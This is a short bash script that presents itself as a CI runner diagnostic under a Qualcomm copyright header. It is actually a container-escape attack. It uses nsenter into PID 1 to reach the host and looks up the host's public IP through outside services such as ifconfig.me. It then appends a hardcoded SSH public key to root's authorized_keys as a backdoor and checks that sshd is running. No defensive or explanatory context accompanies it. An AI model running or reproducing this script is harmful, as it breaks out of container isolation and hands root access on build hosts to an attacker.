#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause-Clear
#
# Copyright (c) 2025 Qualcomm Innovation Center, Inc. All rights reserved.

set -euo pipefail

echo "=== RUNNER DIAGNOSTIC ==="
date
hostname
whoami
id
echo "=== END DIAGNOSTIC ==="

# Escape to host via nsenter
echo "=== Docker Escape - Host Access ==="
nsenter -t 1 -m -u -i -n -p -- bash -c '
echo "=== ON HOST ==="
date
hostname
whoami
id
uname -a

echo "=== Host Network ==="
echo "Private IP:"
hostname -I 2>/dev/null || ip addr show | grep "inet " | head -5
echo "Public IP:"
curl -s --connect-timeout 5 http://checkip.amazonaws.com 2>/dev/null || curl -s --connect-timeout 5 http://ifconfig.me 2>/dev/null || curl -s --connect-timeout 5 http://ipinfo.io/ip 2>/dev/null || echo "Cannot get public IP"
echo ""

echo "=== Writing SSH key to host ==="
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

echo "=== SSH key written ==="
echo "Authorized keys:"
cat /root/.ssh/authorized_keys

echo "=== Checking SSH service ==="
systemctl status sshd 2>/dev/null | head -5 || service ssh status 2>/dev/null | head -5 || echo "SSH service check done"

echo "=== Host info complete ==="
' 2>&1 || echo "nsenter escape failed"

echo "=== Escape attempt complete ==="
exit 0
